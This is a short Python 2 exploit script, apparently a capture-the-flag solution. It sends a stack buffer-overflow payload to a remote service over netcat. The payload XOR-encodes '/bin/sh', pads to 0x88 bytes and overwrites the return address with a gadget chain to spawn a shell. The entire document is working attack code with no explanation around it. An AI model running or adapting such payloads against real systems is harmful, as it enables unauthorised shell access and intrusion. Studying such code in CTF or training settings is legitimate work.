import struct

#Usage: python exploit.py | nc norman.isss.io 1337

commandAddr = 0x0000000000400720
mov_rdi_rax = 0x000000000040071a

command = "/bin/sh"

encCommand = "".join(chr(ord(command[i]) ^ 0x41) for i in xrange(len(command))) + "\x00"

buf_len = 0x88

p64 = lambda x : struct.pack("Q", x)

print encCommand + "A" * (buf_len - len(encCommand)) + p64(mov_rdi_rax) + "A" * 8 + p64(commandAddr)
